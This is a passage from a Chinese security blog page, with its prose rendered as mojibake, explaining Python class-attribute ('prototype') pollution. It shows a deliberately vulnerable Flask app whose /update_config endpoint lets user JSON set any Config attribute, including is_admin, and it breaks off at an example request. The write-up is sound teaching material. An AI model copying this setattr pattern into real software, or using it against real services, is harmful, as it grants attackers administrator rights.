<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="pythonÂéüÂûãÈìæÊ±°Êüì ÂèÇËÄÉÔºöPythonÂéüÂûãÈìæÊ±°ÊüìÂèò‰Ωì(prototype-pollution-in-python) - Ë∑≥Ë∑≥Á≥ñ\nÂ∞±ÂÉèJavascript‰∏≠ÁöÑÂéüÂûãÈìæÊ±°Êüì‰∏ÄÊ†∑ÔºåËøôÁßçÊîªÂáªÊñπÂºèÂèØ‰ª•Âú®Python‰∏≠ÂÆûÁé∞ÂØπÁ±ªÂ±ûÊÄßÂÄºÁöÑÊ±°Êüì„ÄÇÊ±°ÊüìÂè™ÂØπÁ±ªÁöÑÂ±ûÊÄßËµ∑‰ΩúÁî®ÔºåÂØπ‰∫éÁ±ªÊñπÊ≥ïÊòØÊó†ÊïàÁöÑ„ÄÇ\n">
<title>pythonÂéüÂûãÈìæÊ±°Êüì</title>

<link rel='canonical' href='https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/'>

<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="pythonÂéüÂûãÈìæÊ±°Êüì">
<meta property='og:description' content="pythonÂéüÂûãÈìæÊ±°Êüì ÂèÇËÄÉÔºöPythonÂéüÂûãÈìæÊ±°ÊüìÂèò‰Ωì(prototype-pollution-in-python) - Ë∑≥Ë∑≥Á≥ñ\nÂ∞±ÂÉèJavascript‰∏≠ÁöÑÂéüÂûãÈìæÊ±°Êüì‰∏ÄÊ†∑ÔºåËøôÁßçÊîªÂáªÊñπÂºèÂèØ‰ª•Âú®Python‰∏≠ÂÆûÁé∞ÂØπÁ±ªÂ±ûÊÄßÂÄºÁöÑÊ±°Êüì„ÄÇÊ±°ÊüìÂè™ÂØπÁ±ªÁöÑÂ±ûÊÄßËµ∑‰ΩúÁî®ÔºåÂØπ‰∫éÁ±ªÊñπÊ≥ïÊòØÊó†ÊïàÁöÑ„ÄÇ\n">
<meta property='og:url' content='https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/'>
<meta property='og:site_name' content='ÁæéÂíïÂôúÁöÑÂ∞èÁ´ô'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ÂéüÂûãÈìæÊ±°Êüì' /><meta property='article:published_time' content='2025-03-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-27T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png' />
<meta name="twitter:title" content="pythonÂéüÂûãÈìæÊ±°Êüì">
<meta name="twitter:description" content="pythonÂéüÂûãÈìæÊ±°Êüì ÂèÇËÄÉÔºöPythonÂéüÂûãÈìæÊ±°ÊüìÂèò‰Ωì(prototype-pollution-in-python) - Ë∑≥Ë∑≥Á≥ñ\nÂ∞±ÂÉèJavascript‰∏≠ÁöÑÂéüÂûãÈìæÊ±°Êüì‰∏ÄÊ†∑ÔºåËøôÁßçÊîªÂáªÊñπÂºèÂèØ‰ª•Âú®Python‰∏≠ÂÆûÁé∞ÂØπÁ±ªÂ±ûÊÄßÂÄºÁöÑÊ±°Êüì„ÄÇÊ±°ÊüìÂè™ÂØπÁ±ªÁöÑÂ±ûÊÄßËµ∑‰ΩúÁî®ÔºåÂØπ‰∫éÁ±ªÊñπÊ≥ïÊòØÊó†ÊïàÁöÑ„ÄÇ\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="ÂàáÊç¢ËèúÂçï">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu988272603220494224.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üòã</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ÁæéÂíïÂôúÁöÑÂ∞èÁ´ô</a></h1>
            <h2 class="site-description">CialloÔΩû(‚à†„Éªœâ&lt; )‚åí‚òÖ</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://buuoj.cn/users/175721'
                        target="_blank"
                        title="BUUOJ"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
  <line x1="7" y1="12" x2="13" y2="12" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/0d000721999'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>‰∏ªÈ°µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>ÂÖ≥‰∫é</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ÁõÆÂΩï</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#Âç±Èô©‰ª£Á†ÅÊÆµÂêàÂπ∂ÂáΩÊï∞">Âç±Èô©‰ª£Á†ÅÊÆµÔºàÂêàÂπ∂ÂáΩÊï∞Ôºâ</a></li>
    <li><a href="#Ê±°ÊüìËøáÁ®ãÂàÜÊûê">Ê±°ÊüìËøáÁ®ãÂàÜÊûê</a>
      <ol>
        <li><a href="#Êó†Ê≥ïÊ±°ÊüìÁöÑobject">Êó†Ê≥ïÊ±°ÊüìÁöÑ<code>Object</code></a></li>
      </ol>
    </li>
    <li><a href="#Âà©Áî®">Âà©Áî®</a>
      <ol>
        <li><a href="#ÂÖ®Â±ÄÂèòÈáèËé∑Âèñ">ÂÖ®Â±ÄÂèòÈáèËé∑Âèñ</a></li>
        <li><a href="#Â∑≤Âä†ËΩΩÊ®°ÂùóËé∑Âèñ">Â∑≤Âä†ËΩΩÊ®°ÂùóËé∑Âèñ</a>
          <ol>
            <li><a href="#importÂä†ËΩΩËé∑Âèñ">importÂä†ËΩΩËé∑Âèñ</a></li>
            <li><a href="#sysÊ®°ÂùóÂä†ËΩΩËé∑Âèñ">sysÊ®°ÂùóÂä†ËΩΩËé∑Âèñ</a></li>
            <li><a href="#Âä†ËΩΩÂô®loaderËé∑Âèñ">Âä†ËΩΩÂô®loaderËé∑Âèñ</a></li>
            <li><a href="#ÂÆûÈôÖÁéØÂ¢É‰∏≠ÁöÑÂêàÂπ∂ÂáΩÊï∞">ÂÆûÈôÖÁéØÂ¢É‰∏≠ÁöÑÂêàÂπ∂ÂáΩÊï∞</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#ÊîªÂáªÈù¢ÊãìÂ±ï">ÊîªÂáªÈù¢ÊãìÂ±ï</a>
      <ol>
        <li><a href="#ÂáΩÊï∞ÂΩ¢ÂèÇÈªòËÆ§ÂÄºÊõøÊç¢">ÂáΩÊï∞ÂΩ¢ÂèÇÈªòËÆ§ÂÄºÊõøÊç¢</a>
          <ol>
            <li><a href="#__defaults__"><code>__defaults__</code></a></li>
            <li><a href="#__kwdefaults__"><code>__kwdefaults__</code></a></li>
          </ol>
        </li>
        <li><a href="#ÁâπÂÆöÂÄºÊõøÊç¢">ÁâπÂÆöÂÄºÊõøÊç¢</a>
          <ol>
            <li><a href="#osenvironËµãÂÄº"><code>os.environ</code>ËµãÂÄº</a></li>
            <li><a href="#flaskÁõ∏ÂÖ≥Â±ûÊÄß"><code>flask</code>Áõ∏ÂÖ≥Â±ûÊÄß</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#jinjaËØ≠Ê≥ïÊ†áËØÜÁ¨¶">JinjaËØ≠Ê≥ïÊ†áËØÜÁ¨¶</a></li>
    <li><a href="#jinjaËØ≠Ê≥ïÂÖ®Â±ÄÊï∞ÊçÆ">jinjaËØ≠Ê≥ïÂÖ®Â±ÄÊï∞ÊçÆ</a>
      <ol>
        <li><a href="#Ê®°ÊùøÁºñËØëÊó∂ÁöÑÂèòÈáè">Ê®°ÊùøÁºñËØëÊó∂ÁöÑÂèòÈáè</a></li>
      </ol>
    </li>
    <li><a href="#‰æãÈ¢ò">‰æãÈ¢ò</a>
      <ol>
        <li><a href="#dasctf-2023--0x401‰∏ÉÊúàÊöëÊúüÊåëÊàòËµõezflask">[DASCTF 2023 &amp; 0X401‰∏ÉÊúàÊöëÊúüÊåëÊàòËµõ]EzFlask</a></li>
        <li><a href="#ciscn2024-ÂàùËµõ-sanic">[Ciscn2024 ÂàùËµõ] sanic</a></li>
        <li><a href="#dasctf-2024ÊöëÊúüÊåëÊàòËµõ‰∏∫ÁÉ≠Áà±Âπ∂ËÇ©‰ΩúÊàòsanics-revenge">[DASCTF 2024ÊöëÊúüÊåëÊàòËµõÔΩú‰∏∫ÁÉ≠Áà±ÔºåÂπ∂ËÇ©‰ΩúÊàò]Sanic&rsquo;s revenge</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
                <img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png"
                        
                        width="928" 
                        height="1232" 
                        loading="lazy"
                        alt="Featured image of post pythonÂéüÂûãÈìæÊ±°Êüì" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/python/" style="background-color: #2a9d8f; color: #fff;">
                Python
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">pythonÂéüÂûãÈìæÊ±°Êüì</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 27, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    ÈòÖËØªÊó∂Èïø: 27 ÂàÜÈíü
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="pythonÂéüÂûãÈìæÊ±°Êüì">pythonÂéüÂûãÈìæÊ±°Êüì
</h1><p>ÂèÇËÄÉÔºö<a class="link" href="https://tttang.com/archive/1876/"  target="_blank" rel="noopener"
    >PythonÂéüÂûãÈìæÊ±°ÊüìÂèò‰Ωì(prototype-pollution-in-python) - Ë∑≥Ë∑≥Á≥ñ</a></p>
<p>Â∞±ÂÉè<code>Javascript</code>‰∏≠ÁöÑÂéüÂûãÈìæÊ±°Êüì‰∏ÄÊ†∑ÔºåËøôÁßçÊîªÂáªÊñπÂºèÂèØ‰ª•Âú®<code>Python</code>‰∏≠ÂÆûÁé∞ÂØπÁ±ªÂ±ûÊÄßÂÄºÁöÑÊ±°Êüì„ÄÇÊ±°ÊüìÂè™ÂØπÁ±ªÁöÑÂ±ûÊÄßËµ∑‰ΩúÁî®ÔºåÂØπ‰∫éÁ±ªÊñπÊ≥ïÊòØÊó†ÊïàÁöÑ„ÄÇ</p>
<p>ËøôÈáåÂÖà‰∫ÜËß£‰∏Ä‰∏ãpythonÁ±ªÂíåÂÆû‰æãÁöÑÂÖ≥Á≥ª</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Animal</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">species</span> <span class="o">=</span> <span class="s2">&#34;Âä®Áâ©&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">make_sound</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2"> ÂèëÂá∫Â£∞Èü≥&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÔºå<code>Animal</code> ÊòØ‰∏Ä‰∏™Á±ªÔºå<code>species</code> ÊòØÁ±ªÂèòÈáèÔºå<code>name</code> ÊòØÂÆû‰æãÂèòÈáè„ÄÇÂàõÂª∫Â§ö‰∏™<code>Animal</code>ÂÆû‰æãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">dog</span> <span class="o">=</span> <span class="n">Animal</span><span class="p">(</span><span class="s2">&#34;Áãó&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">=</span> <span class="n">Animal</span><span class="p">(</span><span class="s2">&#34;Áå´&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dog</span><span class="o">.</span><span class="n">make_sound</span><span class="p">()</span>  <span class="c1"># ËæìÂá∫: Áãó ÂèëÂá∫Â£∞Èü≥</span>
</span></span><span class="line"><span class="cl"><span class="n">cat</span><span class="o">.</span><span class="n">make_sound</span><span class="p">()</span>  <span class="c1"># ËæìÂá∫: Áå´ ÂèëÂá∫Â£∞Èü≥</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">dog</span><span class="o">.</span><span class="n">species</span><span class="p">)</span>  <span class="c1"># ËæìÂá∫: Âä®Áâ©</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">cat</span><span class="o">.</span><span class="n">species</span><span class="p">)</span>  <span class="c1"># ËæìÂá∫: Âä®Áâ©</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú®Python‰∏≠ÔºåÁ±ªÂèòÈáèÊòØÊâÄÊúâÂÆû‰æãÂÖ±‰∫´ÁöÑ„ÄÇÂ¶ÇÊûúÊàë‰ª¨‰øÆÊîπÁ±ªÂèòÈáèÔºåÊâÄÊúâÂÆû‰æãÈÉΩ‰ºöÂèóÂà∞ÂΩ±Âìç„ÄÇËøôÁ±ª‰ºº‰∫éJavaScript‰∏≠‰øÆÊîπÂéüÂûãÈìæÔºåÂΩ±ÂìçÊâÄÊúâÁªßÊâøËá™ËØ•ÂéüÂûãÁöÑÂØπË±°„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Animal</span><span class="o">.</span><span class="n">species</span> <span class="o">=</span> <span class="s2">&#34;Âì∫‰π≥Âä®Áâ©&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">dog</span><span class="o">.</span><span class="n">species</span><span class="p">)</span>  <span class="c1"># ËæìÂá∫: Âì∫‰π≥Âä®Áâ©</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">cat</span><span class="o">.</span><span class="n">species</span><span class="p">)</span>  <span class="c1"># ËæìÂá∫: Âì∫‰π≥Âä®Áâ©</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êç¢‰∏™ÊÄùË∑ØË¶ÅÊòØËøôÈáåÁöÑAnimalÁ±ªÂèòÊàêConfigÊó∂ÔºåÁÑ∂ÂêéËøô‰∏™Â±ûÊÄßÂèòÊàêis_adminÊó∂ÔºåÂ∞±ËÉΩÊ±°ÊüìÔºåÊääËá™Â∑±ÂèòÊàêÁÆ°ÁêÜÂëò‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># config.py</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Config</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_admin</span> <span class="o">=</span> <span class="kc">False</span>  <span class="c1"># ÈªòËÆ§Áî®Êà∑‰∏çÊòØÁÆ°ÁêÜÂëò</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">set_config</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">setattr</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get_config</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú®ËøôÊ†∑ÁöÑ‰∏Ä‰∏™ÂêéÁ´Ø‰ª£Á†Å‰∏≠,Â∞±‰ºöÂ≠òÂú®ËøôÁßçÂéüÂûãÈìæÊ±°Êüì:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">config</span> <span class="kn">import</span> <span class="n">Config</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/update_config&#39;</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">update_config</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">Config</span><span class="o">.</span><span class="n">set_config</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span> <span class="s2">&#34;config&#34;</span><span class="p">:</span> <span class="n">data</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/check_admin&#39;</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_admin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_admin</span> <span class="o">=</span> <span class="n">Config</span><span class="o">.</span><span class="n">get_config</span><span class="p">(</span><span class="s1">&#39;is_admin&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;is_admin&#34;</span><span class="p">:</span> <span class="n">is_admin</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â¶ÇÊûúÊàë‰ª¨ËøôÊ†∑ËÆæÁΩÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /update_config
</span></span><span class="line"><span class="cl">Content-Type: application/json
